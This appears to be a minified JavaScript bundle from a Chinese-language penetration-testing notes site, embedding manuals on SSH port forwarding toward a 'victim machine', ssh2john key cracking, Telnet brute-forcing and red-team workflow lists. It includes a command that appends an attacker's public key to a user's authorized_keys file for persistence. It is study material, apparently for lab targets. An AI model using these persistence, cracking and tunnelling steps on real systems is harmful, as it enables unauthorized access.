                      `))}]}},Erke:function(H,d,n){"use strict";n.d(d,"b",function(){return r}),n.d(d,"a",function(){return e}),n.d(d,"c",function(){return u});var S=n("oBTY"),t=n("fWQN"),l=n("mtLc"),r=function(){function m(){Object(t.a)(this,m),this.permuteArr=[],this.usedPathChars=[]}return Object(l.a)(m,[{key:"permute",value:function(F,p,I){var g=this,c=function(){I(Object(S.a)(g.usedPathChars),g.permuteArr)&&g.permuteArr.push(g.usedPathChars.slice())};if(F.length<=p)return c(),this.permuteArr;var h,w;for(h=0;h<F.length;h++)w=F.splice(h,1)[0],this.usedPathChars.push(w),F.length==0&&c(),this.permute(F,p,I),F.splice(h,0,w),this.usedPathChars.pop();return this.permuteArr}},{key:"cartesian",value:function(){for(var F=arguments.length,p=new Array(F),I=0;I<F;I++)p[I]=arguments[I];var g=[],c=p.length-1;function h(w,a){for(var B=0,O=p[a].length;B<O;B++){var _=w.slice(0);_.push(p[a][B]),a==c?g.push(_):h(_,a+1)}}return h([],0),g}}]),m}();function e(m){for(var E=[],F=0;F<m.length;F+=1){var p=e(m.slice(0,F).concat(m.slice(F+1)));if(!p.length)E.push([m[F]]);else for(var I=0;I<p.length;I+=1)E.push([m[F]].concat(p[I]))}return E}function u(){for(var m=arguments.length,E=new Array(m),F=0;F<m;F++)E[F]=arguments[F];var p=[],I=E.length-1;function g(c,h){for(var w=0,a=E[h],B=a.length;w<B;w++){var O=c.slice(0),_=E[h][w];O.push(_),h==I?p.push(O):g(O,h+1)}}return g([],0),p}},FOD2:function(H,d,n){"use strict";n.r(d),n.d(d,"ssh2john____ssh_2_John_The_Ripper____cfg",function(){return m}),n.d(d,"SSH_Telnet_\u624B\u518C",function(){return F});var S=n("q1tI"),t=n.n(S),l=n("ysNt"),r=n("s1IG"),e=n("jJ7j"),u=l.l.singleATag_blank,m={name:"\u3010ssh2john\u3011\uFF0C\u5BF9SSH\u5BC6\u94A5\u8F6C\u6362\u4E3A\u3010John The Ripper\u3011\u683C\u5F0F",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

      ssh2john
          \u6240\u5904\u4F4D\u7F6E\uFF1A\u3010/usr/share/john/ssh2john.py\u3011\u3002
          \u3010/usr/share/john/ssh2john.py key > hash\u3011

          \u5C06\u5BC6\u94A5\u8F6C\u6362\u4E3A john the ripper \u53EF\u4EE5\u7406\u89E3\u548C\u7834\u89E3\u5BC6\u7801\u7684\u683C\u5F0F

      `))},E={name:"\u3010SSH\u3011_\u3010Telnet\u3011_\u624B\u518C",steps:[{name:"\u3010SSH\u3011",desc:t.a.createElement(t.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,t.a.createElement(r.b,{special_name:"SSH",var_names_arr:["\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP","ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost","key_path","port_\u53D7\u5BB3\u673A\u5668_\u5F00\u7ED9\u653B\u51FB\u673A\u53BB\u8FDE\u7684","port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A","\u672C\u5730\u653B\u51FB\u673A\u7AEF\u53E3_\u598212345","user_\u53D7\u5BB3\u673A\u5668"],code_template_arr:["ssh  ###<user_\u53D7\u5BB3\u673A\u5668>###@###<\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP>###","ssh  -i  ###<key_path>###  ###<user_\u53D7\u5BB3\u673A\u5668>###@###<\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP>###","\u4E0B\u9762\u7684\uFF0C\u8981\u5728\u3010\u672C\u5730\u653B\u51FB\u673A\u3011\u4E0A\u542F\u52A8\u3001\u8FD0\u884C\uFF1A","ssh  -L  ###<port_\u53D7\u5BB3\u673A\u5668_\u5F00\u7ED9\u653B\u51FB\u673A\u53BB\u8FDE\u7684>###:###<ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>###:###<port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>###    ###<user_\u53D7\u5BB3\u673A\u5668>###@###<\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP>###","\u4E0B\u9762\u7684\uFF0C\u8981\u5728\u3010\u672C\u5730\u653B\u51FB\u673A\u3011\u4E0A\u542F\u52A8\u3001\u8FD0\u884C\uFF1A","ssh  -R  ###<port_\u53D7\u5BB3\u673A\u5668_\u5F00\u7ED9\u653B\u51FB\u673A\u53BB\u8FDE\u7684>###:###<ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>###:###<port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>###    ###<user_\u53D7\u5BB3\u673A\u5668>###@###<\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP>###","\u4E0B\u9762\u7684\uFF0C\u8981\u5728\u3010\u672C\u5730\u653B\u51FB\u673A\u3011\u4E0A\u542F\u52A8\u3001\u8FD0\u884C\uFF1A","ssh  -D  ###<\u672C\u5730\u653B\u51FB\u673A\u7AEF\u53E3_\u598212345>###  ###<user_\u53D7\u5BB3\u673A\u5668>###@###<\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP>###"]}),e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8FD0\u884C
              ssh  <\u7528\u6237\u540D>@<IP\u5730\u5740>

              ssh  -i  <\u5BC6\u94A5\u6587\u4EF6>  <\u7528\u6237\u540D>@<IP\u5730\u5740>


          \u624B\u52A8\u6DFB\u52A0\u3010SSH\u516C\u94A5\u3011

              echo  "ssh-rsa  <\u5177\u4F53\u516C\u94A5\u503C>"  >>  /home/joanna/.ssh/authorized_keys
                  \u4F5C\u7528\uFF1A\u5F80\u5F80\u80FD\u591F\uFF0C\u6DFB\u52A0\u3010\u653B\u51FB\u8005\u516C\u94A5\u3011\uFF1B\u6765\u5B9E\u73B0\u6B3A\u9A97\u767B\u5F55


          \u5E38\u89C1\u9009\u9879

              \u3010\u672C\u5730\u7AEF\u53E3\u8F6C\u53D1\u3011

                      \u3010-L  <\u672C\u5730\u7AEF\u53E3>:<ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>:<port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>\u3011
                          \uFF08\uFF1F\uFF1F\uFF1F \u786E\u5B9A\u4E0D\u662F\u3010-R\u3011\u5417  \uFF1F\uFF1F\uFF1F\uFF09
                          \u8FDB\u884C\u7ED1\u5B9A\uFF0C\u5C06\u672C\u5730\uFF08\u5BA2\u6237\u7AEF\uFF09\u4E3B\u673A\u4E0A\u7684\u6307\u5B9A\u7AEF\u53E3\u8F6C\u53D1\u5230\u6307\u5B9A\u4E3B\u673A\uFF0C\u5E76\u4E14\u8FDC\u7A0B\u7AEF\u7684\u7AEF\u53E3\u3002
                              \u7B80\u5355\u6765\u8BF4\uFF0C\u5C31\u662F\u901A\u8FC7\u3010\u672C\u5730\u7AEF\u53E3\u3011 \u8BBF\u95EE\u3010\u8FDC\u7A0B\u4E3B\u673A\u3011\u7684\u3010\u5BF9\u5E94\u7AEF\u53E3\u3011\u3002
                                  \u672C\u8D28\u4E0A\uFF1A\u5C31\u662F\u7AEF\u53E3\u6620\u5C04\u3002

                              \u4F5C\u7528\u573A\u666F\uFF1A
                                  \u901A\u8FC7SSH\u8BBF\u95EE\u5185\u7F51\uFF0C\u7136\u540E\u5185\u7F51\u91CC\u9762\u7684\u3010\u4E13\u6709\u7F51\u7EDC\u3011\u9700\u8981\u66B4\u9732

                          \u8FDB\u9636\u7406\u89E3\uFF1A
                                  \u5F7B\u5E95\u641E\u61C2SSH\u7AEF\u53E3\u8F6C\u53D1\u547D\u4EE4 - Divergence\u7684\u6587\u7AE0 - \u77E5\u4E4E https://zhuanlan.zhihu.com/p/148825449
                                  https://wangdoc.com/ssh/port-forwarding

                          \u7279\u522B\u8981\u6CE8\u610F\u7684\uFF01\uFF01\uFF01\u5F88\u5751\u7684\uFF01\uFF01\uFF01

                                  \u8FDE\u63A5\u540E\uFF0C\u8981\u3010\u4FDD\u7559\u5F53\u524Dsession\u3011\u3002
                                      \u4F60\u81EA\u5DF1\u53E6\u5916\u5F00\u4E00\u4E2A\u3010\u547D\u4EE4\u884C\u3011\uFF0C\u7136\u540E\u518D\u8FDE\u8FC7\u6765\uFF01
                                              \u4E0D\u80FD\u5173\u95ED\uFF0C\u5173\u95ED\u4E86\u5C31\u8FDE\u4E0D\u8FDB\u6765\u4E86\uFF01\uFF01
                                              \u5C31\u5F88\u5751\uFF0C\u88AB\u5751\u8FC7\u4E00\u6B21

                          \u7C7B\u4F3C\u7684\uFF1A

                                  \u3010-R\u3011
                                      \u53CD\u5411\uFF0Cforward
                                      \u7C7B\u4F3C\u4E8E \u7AEF\u53E3\u6620\u5C04 \u4E4B\u7C7B\u7684\u3002
                                      \u4E3E\u4F8B\uFF1A
                                          \u3010ssh  -R  1337:127.0.0.1:52946  root@10.10.14.2\u3011
                                              \u521B\u5EFA\u8FDC\u7A0BSSH\u96A7\u9053\uFF0C\u8BE5\u96A7\u9053\u5C06\u4ECE\u7AEF\u53E3\u8F6C\u53D1\u6240\u6709\u8FDE\u63A5\u3002\u6211\u4EEC\u4E3B\u673A\u7684\u30101337\u3011\uFF0C\u5C06\u8F6C\u53D1\u5230\u3010\u76EE\u6807\u76D2\u5B50\u3011\u7684\u7AEF\u53E352946\u3002

                          \u8FDB\u9636\u9009\u9879\uFF1A

                                  \u3010-f\u3011
                                      \uFF1F\uFF1F\uFF1F
                                      \u8981\u6C42 \u5728\u6267\u884C\u547D\u4EE4\u524D\u9000\u81F3\u540E\u53F0. \u5B83\u7528\u4E8E\u5F53 \u51C6\u5907\u8BE2\u95EE\u53E3\u4EE4\u6216\u5BC6\u8BED, \u4F46\u662F\u7528\u6237\u5E0C\u671B\u5B83\u5728\u540E\u53F0\u8FDB\u884C.
                                          \u8BE5\u9009\u9879\u9690\u542B\u4E86 -n \u9009\u9879. \u5728\u8FDC\u7AEF\u673A\u5668\u4E0A\u542F\u52A8 X11 \u7A0B\u5E8F\u7684\u63A8\u8350\u624B\u6CD5\u5C31\u662F\u7C7B\u4F3C\u4E8E ssh -f host xterm \u7684\u547D\u4EE4.

                                  \u3010-N\u3011
                                      \uFF1F\uFF1F\uFF1F
                                      \u4E0D\u6267\u884C\u8FDC\u7A0B\u547D\u4EE4. \u7528\u4E8E\u8F6C\u53D1\u7AEF\u53E3. (\u4EC5\u9650\u534F\u8BAE\u7B2C\u4E8C\u7248)

              \u3010\u52A8\u6001\u7AEF\u53E3\u8F6C\u53D1\u3011

                      \u3010ssh  -D  <\u672C\u5730\u7AEF\u53E3_\u59821234>  <\u53D7\u5BB3\u673A\u7528\u6237\u540D>@<\u53D7\u5BB3\u673A\u7684\u8FDC\u7A0BIP>\u3011

                          \u89E3\u91CA\uFF1A
                                  \u548C\u3010\u672C\u5730\u7AEF\u53E3\u8F6C\u53D1\u3011\u4E0D\u540C\u7684\u662F\uFF1A
                                          \u6240\u6709\u7684\u6D41\u91CF\uFF0C\u90FD\u4F1A\u8D70\uFF08\u5047\u8BBE\uFF09\u30101234\u3011\u8FDB\u884C\u3010\u8FDB\u5165\u8F6C\u53D1\u3011\u3002

                                          \u4F46\u662F\u3010\u6700\u7EC8\u8F6C\u53D1\u3011\u5230\u4F55\u5904\uFF0C\u662F\u3010\u53D1\u5305\u8F6F\u4EF6\u3011\u81EA\u8EAB\u51B3\u5B9A\u7684\uFF1B\u5E76\u4E0D\u7531\u3010SSH\u8F6F\u4EF6\u3011\u51B3\u5B9A\u3002
                                                  \u53EF\u80FD\u53D1\u5230\u3010\u53D7\u5BB3\u673A 10000\u3011\u3001\u301020000\u3011\u6216\u3010\u53D7\u5BB3\u673A 50000\u3011
                                                      \u90FD\u7531\u3010\u53D1\u5305\u8F6F\u4EF6\u3011\u81EA\u5DF1\u6765\u5B9A


                                          \u4E3E\u4F8B\uFF1A
                                                  \u672C\u5730\u7AEF\u53E3\u8F6C\u53D1\uFF1A\u3010ssh  -L  1234:localhost:5432    christine@10.129.105.182\u3011
                                                          \u76EE\u7684\u660E\u786E\uFF0C
                                                              \u8981\u8FDE\u5230\u3010\u53D7\u5BB3\u673A\u3011\u7684\u3010\u5185\u90E85432\u3011\u7AEF\u53E3\u3002

                                                  \u52A8\u6001\u7AEF\u53E3\u8F6C\u53D1\uFF1A\u3010ssh  -D  12345  christine@10.129.105.182\u3011
                                                          \u8FD9\u91CC\uFF0C\u5C31\u8981\u770B\u3010\u53D1\u5305\u8F6F\u4EF6\u3011\u81EA\u5DF1\u7684\u76EE\u6807\u7AEF\u53E3\u662F\u591A\u5C11\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026

                                                          \u57FA\u672C\u6D41\u7A0B\uFF1A\u3010\u53D1\u5305\u8F6F\u4EF6\u3011\u6307\u5B9A\u30105432\u7AEF\u53E3\u3011\u2014\u2014\u2014\u2014>\u88AB\u3010ProxyChains\u3011\u62E6\u622A\u5E76\u8F6C\u53D1\u5230\u30101234\u3011\u2014\u2014\u2014\u2014>\u30101234\u3011\u88ABSSH\u6240\u83B7\u5F97\uFF0C\u5E76\u53D1\u5F80\u3010\u53D7\u5BB3\u673A\u5668\u3011
                                                                    \u2014\u2014\u2014\u2014>\u3010\u53D7\u5BB3\u673A\u5668\u3011\u6309\u7167\u30105432\u7AEF\u53E3\u3011\u8FDB\u884C\u63A5\u6536\u3002

                                  \u6240\u9700\u8981\u7684\u5DE5\u5177\uFF1A
                                          \u3010ProxyChains\u3011
                                                  1\u3001\u4FEE\u6539\u3010/etc/proxychains4.conf\u3011\u914D\u7F6E\u6587\u4EF6\u3002
                                                          1\u3001\u3010strict_chain\u3011\u88AB\u5173\u95ED\u3001\u6CE8\u91CA\u3001
                                                          2\u3001\u3010dynamic_chain\u3011\u3001\u3010random_chain \u3011\uFF0C\u90FD\u6253\u5F00\u3001\u53D6\u6D88\u6CE8\u91CA\u3002
                                                          3\u3001\u8BBE\u7F6E\u3010ProxyList\u3011\u3002
                                                                  \u901A\u8FC7  socks5  \u3001  socks4  \u65B9\u5F0F\uFF0C\u6765\u914D\u7F6E\u3002
                                                                          \u4E3E\u4F8B\uFF1A
                                                                                  <SNIP>
                                                                                  [ProxyList]
                                                                                  # add proxy here ...
                                                                                  # meanwile
                                                                                  # defaults set to "tor"
                                                                                  #socks4 127.0.0.1 9050
                                                                                  socks5 127.0.0.1 1234

                                                  2\u3001\u8BBE\u7F6E\u597D\u4E4B\u540E\uFF0C\u5927\u529F\u544A\u6210\uFF01  \u5C06\u3010psql\u3011\u5957\u7740\u3010proxychains\u3011\u4F7F\u7528\uFF1A
                                                          \u3010proxychains  psql  -U  <user_\u53D7\u5BB3\u673A\u5668>  -h  <ip_\u57FA\u4E8E\u53D7\u5BB3\u673A\u5668\u7684\u89C6\u89D2_\u5982localhost>  -p  <port_\u53D7\u5BB3\u673A\u5668_\u5185\u90E8\u6240\u6301\u6709\u7684_\u9700\u8981\u8F6C\u53D1\u7684\u90A3\u4E2A>\u3011

                                                                  \u5982\u3010proxychains psql -U christine -h localhost -p 5432\u3011

                          \u6700\u7EC8\u7684\u4F18\u52BF\uFF1A

                                  \u4E00\u3001\u66F4\u4E3A\u65B9\u4FBF\u3001\u66F4\u4E3A\u7075\u6D3B\u3002
                                  \u4E8C\u3001\u501F\u52A9 ProxyChains4 \u7684\u8BDD\uFF0C\u66F4\u65B9\u4FBF\u89C4\u5212\u548C\u7BA1\u7406
                                  \u4E09\u3001  \u5177\u4F53\u64CD\u4F5C\u8D77\u6765\u7684\u65F6\u5019\uFF0C\u5C31\u597D\u50CF\u3010\u81EA\u5DF1\u7684\u673A\u5668\u3011\u4E0A\u4E00\u6837\u3002
                                          \uFF08\u8FD9\u70B9  \u5012\u662F\u3010\u672C\u5730\u7AEF\u53E3\u8F6C\u53D1\u3011    \u4E5F\u6709 localhost \u8FD9\u6837\u7684\u64CD\u4F5C\uFF1B  \u4E0D\u8FC7\u90A3\u4E2A\u7684\u7AEF\u53E3\u80AF\u5B9A  \u8981\u6709\u6240\u53D8\u5316  \u907F\u5F00\u7684  \u3001\u53EF\u80FD\u5C31\u6709\u70B9\u5C0F\u9EBB\u70E6  \uFF09

          `))},{name:"\u96A7\u9053\u3001\u53CD\u5411\u4EE3\u7406  \uFF08\u597D\u50CF\u8FD9\u4E2A\uFF0C\u522B\u7684\u5730\u65B9\u4E5F\u6709\uFF1F\uFF1F\uFF1F  \u662F\u4E0D\u662F\u4F1A\u6709\u70B9\u91CD\u590D\uFF09",content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
\u57FA\u672C\u4ECB\u7ECD\uFF1A
    \u7AEF\u53E3\u8F6C\u53D1\uFF0C  \u6216\u8005\u53EB  \u96A7\u9053\u3002
            `))},m]},{name:"\u3010Telnet\u3011",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  \u4ECB\u7ECD\uFF1A
                      \u662F\u7C7B\u4F3C\u4E8E\u300Assh\u300B\u7684\u8FDC\u7A0B\u7EC8\u7AEF\u5DE5\u5177\u3002

                  \u4F7F\u7528\u65B9\u5F0F\uFF1A
                      \u7C7B\u4F3C\u4E8E\u300Assh\u300B\u3002

                  \u76F8\u5173\u5229\u7528\u65B9\u5F0F\uFF1A
                      \u4E00\uFF1A\u7206\u7834\u5BC6\u7801    \u5982 admin/123456
                      \u4E8C\uFF1AXXXX

                  `))}]},F=E},FdYU:function(H,d,n){"use strict";n.r(d);var S=n("q1tI"),t=n.n(S),l=n("PlTX"),r=n("R1qD");d.default=function(){return t.a.createElement(t.a.Fragment,null,t.a.createElement(r.a,{h_em:21.5}),t.a.createElement("div",{style:{marginTop:"1em"}},t.a.createElement(l.a,{flag_personalText:!1})))}},HJBr:function(H,d,n){"use strict";n.d(d,"f",function(){return g}),n.d(d,"e",function(){return w}),n.d(d,"d",function(){return a}),n.d(d,"a",function(){return O}),n.d(d,"b",function(){return _}),n.d(d,"c",function(){return b});var S=n("Pv/L"),t=n("oBTY"),l=n("q1tI"),r=n.n(l),e=n("bxSD"),u=n("ysNt"),m=n("AfFY"),E=[0,0+1,0+1+3,0+1+3+9,0+1+3+9+27];function F(y,j){var v=j-1,x=j+1-1;return y.slice(E[v],E[x])}function p(y){return y.map(function(j){if(u.l.check_isString(j))return j;var v=j,x=I(v);return x})}function I(y){var j=y,v=j[0]||"--",x=j.slice(1),T=F(x,1),R=F(x,2),s=F(x,3),o=F(x,4);return{name:v,sub:{lv1:p(T),lv2:p(R),lv3:p(s),lv4:p(o)}}}var g=function(j){var v=j.strings,x=j.size,T=x===void 0?"medium":x,R=j.isMobile,s=R===void 0?!1:R,o=["--"].concat(Object(t.a)(v)),i=I(o).sub,f=i.lv1,P=i.lv2,D=i.lv3,C=i.lv4;if(s){let L=function(J){if(u.l.check_isString(J)){var q=J;return r.a.createElement(r.a.Fragment,null,r.a.createElement("li",null,q))}else{var V=J,tu=Object(S.a)(V),Y=tu[0],au=tu.slice(1);return r.a.createElement(r.a.Fragment,null,r.a.createElement("li",null,Y),r.a.createElement("ol",null,au.map(function(hu){return r.a.createElement(r.a.Fragment,null,r.a.createElement("li",null,L(hu)))})))}};var M="ol";switch(M){case"ol":return r.a.createElement("ol",null,v.map(function(J){return L(J)}));case"\u666E\u901A\u6587\u672C":return r.a.createElement("ol",null,v.flat(21).map(function(J){return r.a.createElement("li",null,J)}))}}else return r.a.createElement(r.a.Fragment,null,r.a.createElement(e.a,{cfg:{lv1:f,lv2:P,lv3:D,lv4:C!=null?C:[]},size:T}))},c=["\u67E5\u627E\u4E2D\u95F4\u4EF6","\u67E5\u627E\u4E2D\u95F4\u4EF6\u7248\u672C\u3001\u67E5\u627ECVE",["\u6587\u4EF6\u67E5\u627E","\u8FDB\u884C\u76EE\u5F55\u679A\u4E3E","\u6574\u7406\u9690\u79C1\u6587\u4EF6","\u6CE8\u610F\u4E00\u4E9B\u3010\u91CD\u8981\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011",["123","456","789","10-11-12",["aaa","bbb","ccc","ddd","eee",["\u6807\u98981","\u5185\u5BB91","\u5185\u5BB92","\u5185\u5BB93","\u5185\u5BB94"]]]],"123"],h=["\u67E5\u627E\u4E2D\u95F4\u4EF6","\u67E5\u627E\u4E2D\u95F4\u4EF6\u7248\u672C\u3001\u67E5\u627ECVE","\u4E2D\u95F4\u4EF6\uFF0C\u5982\u679C\u6709\u767B\u5F55\u53E3\uFF0C\u53EF\u4EE5\u67E5\u627E\u9ED8\u8BA4\u5BC6\u7801","\u8FDB\u884C\u76EE\u5F55\u679A\u4E3E","\u6574\u7406\u9690\u79C1\u6587\u4EF6","\u6CE8\u610F\u4E00\u4E9B\u3010\u91CD\u8981\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011",["\u5F31\u53E3\u4EE4\uFF0C\u4ECE\u6CA1\u6709\u4E00\u4E2A\u65F6\u4EE3\uFF0C\u50CF\u73B0\u5728","1"],["\u4EE5\u3010\u53EF\u53E0\u52A0\u3011\u65B9\u5F0F\u6536\u96C6\u6700\u65B0\u7684\u6F0F\u6D1E\u4FE1\u606F","HackerOne","i.hacking8.com"]],w=r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",null,"\u901A\u7528\u8868\u2014\u2014\u770B\u4E0D\u5230\u4FE1\u606F\u2014\u2014\u9700\u8981\u76F2\u8BD5"),r.a.createElement("h2",null,"\uFF08\u91CD\u8981\u6027\u6392\u5E8F\uFF09"),r.a.createElement(g,{strings:h,size:"mini"})),a=r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",null,"\u9776\u673A\u600E\u4E48\u6253"),r.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),r.a.createElement(g,{strings:["\u5916\u90E8\u4FE1\u606F\u6536\u96C6\uFF08\u975E\u5FC5\u8981\uFF09",["Enumeration/\u679A\u4E3E","\u8D44\u4EA7\u626B\u63CF"],"Identification / \uFF1F\uFF1F\uFF1F","Exploit / Exp\u5229\u7528","Foothold/\u5229\u7528\u70B9\u67E5\u627E","Post-Exploitation / \u540E\u6E17\u900F","Lateral Movement / \u6A2A\u5411\u6E17\u900F","Privilege Escalation / \u63D0\u6743"],size:"mini"}));function B(y){var j=y.routes,v=y.name,x=v===void 0?"--":v;return j?[x].concat(Object(t.a)(j.map(function(T){return B(T)}))):x}var O=r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",null,"\u6B63\u5E38\u5168\u6D41\u7A0B-\u6E17\u900F\u6D4B\u8BD5\u6D41\u7A0B"),r.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),function(){var y=Object(t.a)(m.c.get_\u6E17\u900F\u6D41\u7A0B_routes().map(function(j){return B(j)}));return r.a.createElement(g,{strings:y,size:"mini"})}()),_=r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",null,"\u56FD\u8D44\u4E91\u6388\u6743\u6D4B\u8BD5"),r.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),r.a.createElement(g,{strings:[["\u5916\u7F51\u6D4B\u8BD5","\u4FE1\u606F\u6536\u96C6\uFF08\u7565\uFF09",["\u8D44\u4EA7\u626B\u63CF","Goby","nmap"],["\u6F0F\u6D1E\u624B\u6D4B",["\u8D26\u53F7\u76F8\u5173","\u5F31\u53E3\u4EE4"],"SQL\u6CE8\u5165"]],["\u5185\u7F51\u6D4B\u8BD5",["\u8D44\u4EA7\u626B\u63CF","FScan\uFF08\u6548\u679C\u5947\u597D\uFF01\u64CD\u4F5C\u50BB\u74DC\uFF09","\u548C\u5916\u7F51\u76F8\u540C\uFF1AGoby\u3001nmap"]]],size:"mini"})),b=r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",null,"\u62A4\u7F51\u7EA2\u961F"),r.a.createElement("h2",null,"\u987A\u5E8F\u6392\u5E8F"),r.a.createElement(g,{strings:[["\u57FA\u672C\u6D41\u7A0B","\u5165\u53E3\u6743\u9650\uFF08\u79F0\u4E3A\u6253\u70B9\uFF09","\u5185\u7F51\u641C\u96C6/\u63A2\u6D4B","\u514D\u6740\u63D0\u6743","\u6293\u53D6\u767B\u5F55\u51ED\u8BC1","\u8DE8\u5E73\u53F0\u7684\u6A2A\u5411\u653B\u51FB","\u5165\u53E3\u6743\u9650\u7EF4\u6301","\u96A7\u9053\u6570\u636E\u56DE\u4F20","\u5B9A\u671F\u6743\u9650\u7EF4\u6301"],"\u4FE1\u606F\u6CC4\u9732\u6536\u96C6","\u8D44\u4EA7\u6536\u96C6"],size:"mini"}))},NsKX:function(H,d,n){H.exports={pyramidWra:"pyramidWra___27LyC",isOverFlow:"isOverFlow___2Gm9M",pyramidItem:"pyramidItem___33y6q",pyramidItem_levelTag:"pyramidItem_levelTag___3a_4s",pyramidItem_SubItem_Title:"pyramidItem_SubItem_Title___1kxQ_",pyramidLv:"pyramidLv___ReHfA",pyramid_lv_1_item:"pyramid_lv_1_item___2M4nG",pyramid_lv_2_item:"pyramid_lv_2_item___2qhNd",pyramid_lv_3_item:"pyramid_lv_3_item___3gwuq",pyramid_lv_4_item:"pyramid_lv_4_item___2vZY_"}},NvD2:function(H,d,n){"use strict";n.d(d,"a",function(){return u});var S=n("Kwbf");function t(m,E){var F=new Set;return m.forEach(function(p){E.has(p)||F.add(p)}),F}function l(m){var E=m||{},F=E.disabled,p=E.disableCheckbox,I=E.checkable;return!!(F||p)||I===!1}function r(m,E,F,p){for(var I=new Set(m),g=new Set,c=0;c<=F;c+=1){var h=E.get(c)||new Set;h.forEach(function(O){var _=O.key,b=O.node,y=O.children,j=y===void 0?[]:y;I.has(_)&&!p(b)&&j.filter(function(v){return!p(v.node)}).forEach(function(v){I.add(v.key)})})}for(var w=new Set,a=F;a>=0;a-=1){var B=E.get(a)||new Set;B.forEach(function(O){var _=O.parent,b=O.node;if(!(p(b)||!O.parent||w.has(O.parent.key))){if(p(O.parent.node)){w.add(_.key);return}var y=!0,j=!1;(_.children||[]).filter(function(v){return!p(v.node)}).forEach(function(v){var x=v.key,T=I.has(x);y&&!T&&(y=!1),!j&&(T||g.has(x))&&(j=!0)}),y&&I.add(_.key),j&&g.add(_.key),w.add(_.key)}})}return{checkedKeys:Array.from(I),halfCheckedKeys:Array.from(t(g,I))}}function e(m,E,F,p,I){for(var g=new Set(m),c=new Set(E),h=0;h<=p;h+=1){var w=F.get(h)||new Set;w.forEach(function(_){var b=_.key,y=_.node,j=_.children,v=j===void 0?[]:j;!g.has(b)&&!c.has(b)&&!I(y)&&v.filter(function(x){return!I(x.node)}).forEach(function(x){g.delete(x.key)})})}c=new Set;for(var a=new Set,B=p;B>=0;B-=1){var O=F.get(B)||new Set;O.forEach(function(_){var b=_.parent,y=_.node;if(!(I(y)||!_.parent||a.has(_.parent.key))){if(I(_.parent.node)){a.add(b.key);return}var j=!0,v=!1;(b.children||[]).filter(function(x){return!I(x.node)}).forEach(function(x){var T=x.key,R=g.has(T);j&&!R&&(j=!1),!v&&(R||c.has(T))&&(v=!0)}),j||g.delete(b.key),v&&c.add(b.key),a.add(b.key)}})}return{checkedKeys:Array.from(g),halfCheckedKeys:Array.from(t(c,g))}}function u(m,E,F,p){var I=[],g;p?g=p:g=l;var c=new Set(m.filter(function(B){var O=!!F[B];return O||I.push(B),O})),h=new Map,w=0;Object.keys(F).forEach(function(B){var O=F[B],_=O.level,b=h.get(_);b||(b=new Set,h.set(_,b)),b.add(O),w=Math.max(w,_)}),Object(S.a)(!I.length,"Tree missing follow keys: ".concat(I.slice(0,100).map(function(B){return"'".concat(B,"'")}).join(", ")));var a;return E===!0?a=r(c,h,w,g):a=e(c,E.halfCheckedKeys,h,w,g),a}},ONbu:function(H,d,n){"use strict";n.r(d),n.d(d,"\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C",function(){return c});var S=n("tJVT"),t=n("fWQN"),l=n("q1tI"),r=n.n(l),e=n("/qoP"),u=n("ysNt"),m=n("EkZe"),E=n("jJ7j"),F=u.l.singleATag_blank,p=function h(){Object(t.a)(this,h)};p.\u5E38\u7528=`
  \u76F8\u5173\u7684\u81EA\u52A8\u679A\u4E3E\u5DE5\u5177

      Linux\uFF1A

          \u3010LinPEAS\u3011
              \u8D44\u6599\uFF1Ahttps://github.com/carlospolop/PEASS-ng

              \u5F88\u68D2\u7684\u3010\u6743\u9650\u63D0\u5347\u3011\u811A\u672C\u5957\u4EF6       \uFF08\u5E26\u5F69\u8272\u8F93\u51FA\uFF09

              \u5B50\u9879\u76EE\u3010linPEAS\u3011
                  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
                      \u5F88\u68D2\u7684\u3010Linux \u6743\u9650\u63D0\u5347\u3011\u811A\u672C

